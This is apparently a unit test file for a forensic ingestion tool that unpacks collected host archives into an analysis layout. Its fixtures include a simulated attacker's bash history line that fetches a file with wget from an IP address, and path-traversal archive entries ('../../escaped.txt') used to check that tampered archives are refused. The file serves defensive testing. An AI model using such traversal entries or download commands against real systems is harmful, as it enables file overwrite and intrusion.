"""Gandalf source node: archives become <output>/<host>/artefacts/raw/ in Elrond's layout.

Run: python3 -m unittest tests/unit/test_gandalf_ingest.py
"""
import io
import os
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

# Appended, not prepended: src/analysis/platform would shadow the stdlib module.
sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rivendell.core import gandalf  # noqa: E402
from rivendell.core.identify import parse_gandalf_host_info  # noqa: E402

UNIX_LAYOUT = {
    "artefacts/host.info": "lab-rocky::Linux\nLinux lab-rocky 7.0\n",
    "artefacts/process.info": "ps",
    "artefacts/etc+passwd": "root:x:0:0",
    "artefacts/etc+group": "root:x:0:",
    "artefacts/logs/auth.log": "Failed password from 198.51.100.77",
    "artefacts/logs/journal/abc/system.journal": "j",
    "artefacts/conf/system+lab-sync.service": "[Service]",
    "artefacts/cron/etc+crontab": "* * * * * root x",
    "artefacts/cron/lab-update": "*/5 * * * * root y",
    "artefacts/user/gandalf/.bash_history": "wget http://198.51.100.23/x",
    "artefacts/user/gandalf/ssh/authorized_keys": "ssh-ed25519 AAAA attacker@rivendell-lab.test",
    "log.audit": "audit",
}


def write_tarball(path, files, extra=None):
    with tarfile.open(path, "w:gz") as tar:
        root = tarfile.TarInfo(".")  # gandalf.sh archives start with ./
        root.type = tarfile.DIRTYPE
        tar.addfile(root)
        for name, body in files.items():
            data = body.encode()
            info = tarfile.TarInfo("./" + name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        for info, data in extra or []:
            tar.addfile(info, io.BytesIO(data))


class GandalfIngestTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.acq = self.root / "bash_collection" / "acquisitions"
        self.out = self.root / "out"
        self.out.mkdir()

    def tearDown(self):
        self.tmp.cleanup()

    def assess(self):
        allimgs = {}
        gandalf.assess_gandalf(False, True, False, False, False, False, {}, str(self.acq) + "/", os.getcwd(),
                               False, [], str(self.out) + "/", "", allimgs, {}, "", False, False)
        return allimgs

    def test_unix_layout_maps_to_elrond_raw(self):
        (self.acq / "lab-rocky").mkdir(parents=True)
        write_tarball(self.acq / "lab-rocky" / "lab-rocky.tar.gz", UNIX_LAYOUT)
        allimgs = self.assess()

        raw = self.out / "lab-rocky" / "artefacts" / "raw"
        self.assertEqual(allimgs, {str(raw): "lab-rocky::Linux"})
        for rel in ("passwd", "group", "crontab", "cron/lab-update", "logs/var+auth.log",
                    "journal/abc/system.journal", "conf/system+lab-sync.service",
                    "user_profiles/gandalf+bash_history", "user_profiles/gandalf+authorized_keys"):
            self.assertTrue((raw / rel).is_file(), rel)
        self.assertTrue((self.out / "lab-rocky" / "artefacts" / "process.info").is_file())
        self.assertTrue((self.out / "lab-rocky" / "gandalf_log.audit").is_file())
        self.assertFalse((self.out / gandalf.STAGING_DIR).exists())

    def test_windows_zip_already_in_elrond_layout(self):
        (self.acq / "WIN11").mkdir(parents=True)
        with zipfile.ZipFile(self.acq / "WIN11" / "WIN11.zip", "w") as z:
            z.writestr("artefacts\\artefacts\\host.info", "WIN11::Windows10\n")
            z.writestr("artefacts\\artefacts\\processes.csv", "Name\n")
            z.writestr("artefacts\\artefacts\\raw\\registry\\SYSTEM", "regf")
            z.writestr("artefacts\\artefacts\\raw\\evt\\Security.evtx", "ElfFile")
        allimgs = self.assess()

        art = self.out / "WIN11" / "artefacts"
        self.assertEqual(allimgs, {str(art / "raw"): "WIN11::Windows10"})
        self.assertTrue((art / "raw" / "registry" / "SYSTEM").is_file())
        self.assertTrue((art / "raw" / "evt" / "Security.evtx").is_file())
        self.assertTrue((art / "processes.csv").is_file())
        self.assertFalse((self.root / "escaped.txt").exists())

    def test_hostile_and_unreadable_archives(self):
        (self.acq / "bad").mkdir(parents=True)
        escape = tarfile.TarInfo("../../escaped.txt")
        escape.size = 1
        write_tarball(self.acq / "bad" / "bad.tar.gz", {"artefacts/host.info": "bad::Linux\n"}, [(escape, b"x")])
        (self.acq / "evil").mkdir(parents=True)
        with zipfile.ZipFile(self.acq / "evil" / "evil.zip", "w") as z:
            z.writestr("artefacts\\host.info", "evil::Linux\n")
            z.writestr("..\\..\\escaped.txt", "x")
        (self.acq / "bad" / "broken.zip").write_bytes(b"not a zip")
        (self.acq / "bad" / "._bad.tar.gz").write_bytes(b"\x00\x05")
        (self.acq / "good").mkdir(parents=True)
        write_tarball(self.acq / "good" / "good.tar.gz", {"artefacts/host.info": "good::Linux\n", "artefacts/etc+passwd": "x"})
        allimgs = self.assess()

        # Tampered archives are refused whole; unreadable ones are skipped; the rest still ingest.
        self.assertEqual(list(allimgs.values()), ["good::Linux"])
        self.assertFalse((self.root / "escaped.txt").exists())
        self.assertFalse((self.root.parent / "escaped.txt").exists())

    def test_reingest_reuses_existing_output(self):
        (self.acq / "lab-rocky").mkdir(parents=True)
        write_tarball(self.acq / "lab-rocky" / "lab-rocky.tar.gz", UNIX_LAYOUT)
        self.assess()
        cooked = self.out / "lab-rocky" / "artefacts" / "cooked"
        cooked.mkdir()
        (cooked / "kept.csv").write_text("x")
        self.assess()
        self.assertTrue((cooked / "kept.csv").exists())
        self.assertFalse((self.out / "lab-rocky" / "artefacts" / "raw" / "passwd.1").exists())

    def test_host_info_formats(self):
        self.assertEqual(parse_gandalf_host_info("h::Linux"), ("h", "Linux"))
        self.assertEqual(parse_gandalf_host_info("Linux h 7.0 #1 SMP aarch64"), ("h", "Linux"))
        self.assertEqual(parse_gandalf_host_info("Darwin m 25.0.0"), ("m", "macOS"))
        self.assertEqual(parse_gandalf_host_info("uname_result(system='Linux', node='h', release='7')"), ("h", "Linux"))


if __name__ == "__main__":
    unittest.main()
